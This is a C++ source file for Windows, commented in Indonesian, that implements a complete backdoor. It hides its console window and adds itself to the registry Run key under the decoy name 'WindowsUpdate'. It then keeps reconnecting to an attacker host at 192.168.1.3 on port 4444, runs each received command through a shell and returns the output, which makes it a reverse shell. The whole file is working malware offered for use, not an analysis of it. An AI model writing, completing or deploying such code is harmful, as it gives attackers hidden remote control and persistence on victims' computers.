#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

#define ATTACKER_API "http://192.168.1.3:5000"
#define REG_PATH L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_NAME L"WindowsUpdate"

// Fungsi menambahkan program ke registry untuk auto-run
void add_to_registry()
{
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::wstring wPath(path, path + strlen(path));

    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, REG_NAME, 0, REG_SZ, (BYTE *)wPath.c_str(), (wPath.length() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

// Fungsi menjalankan perintah shell
std::string execCommand(const std::string &command)
{
    static std::string currentDir = "C:\\";

    if (command.length() == 2 && command[1] == ':')
    {
        if (SetCurrentDirectoryA(command.c_str()))
        {
            currentDir = command + "\\";
        }
        return currentDir;
    }

    if (command.substr(0, 3) == "cd ")
    {
        std::string newPath = command.substr(3);
        if (SetCurrentDirectoryA(newPath.c_str()))
        {
            char path[MAX_PATH];
            GetCurrentDirectoryA(MAX_PATH, path);
            currentDir = path;
        }
        return currentDir;
    }

    // Perbaikan: Menangani perintah 'cls'
    if (command == "cls")
    {
        return "\033[2J\033[H"; // Escape sequence untuk membersihkan layar pada terminal ANSI
    }

    std::string shellCommand = command;
    char buffer[128];
    std::string result = "";
    FILE *pipe = _popen(shellCommand.c_str(), "r");
    if (!pipe)
        return "[ERROR] Failed to execute command.";

    while (fgets(buffer, sizeof(buffer), pipe) != NULL)
    {
        result += buffer;
    }
    _pclose(pipe);
    return result.empty() ? "[INFO] Command executed successfully." : result;
}

// Fungsi untuk menjalankan backdoor
void run_backdoor()
{
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    while (true)
    {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        server.sin_family = AF_INET;
        server.sin_port = htons(4444);
        server.sin_addr.s_addr = inet_addr("192.168.1.3");

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0)
        {
            char buffer[1024];

            while (true)
            {
                int recv_size = recv(sock, buffer, sizeof(buffer), 0);
                if (recv_size <= 0)
                    break;
                buffer[recv_size] = '\0';
                std::string command(buffer);

                std::string output = execCommand(command);
                send(sock, output.c_str(), output.length(), 0);
            }
        }
        closesocket(sock);
        Sleep(10000);
    }
}

int main()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);

    add_to_registry();
    while (true)
    {
        run_backdoor();
        Sleep(5000);
    }
    return 0;
}
